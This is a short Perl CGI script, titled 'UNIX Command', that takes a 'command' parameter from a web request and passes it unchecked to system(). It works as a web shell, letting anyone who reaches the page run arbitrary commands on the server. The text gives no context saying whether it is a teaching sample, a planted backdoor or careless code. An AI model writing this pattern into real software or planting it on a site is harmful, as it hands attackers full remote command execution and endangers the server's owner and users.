#!/usr/bin/perl
use strict;
use CGI':standard';

print header();
print start_html('UNIX Command');

my $command = param("command");
system($command);

print end_html();
